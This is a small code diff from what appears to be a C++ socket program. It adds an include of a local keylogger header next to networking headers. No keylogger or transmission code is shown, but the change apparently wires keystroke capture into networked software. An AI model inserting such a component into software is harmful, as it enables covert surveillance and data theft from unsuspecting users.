@@ -13,6 +13,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include "./keylogger/keylogger.h"
 //#include "../server/stringProcess.h"
 
 void concatenate(char*& res, const char* buf, int &maxLength);
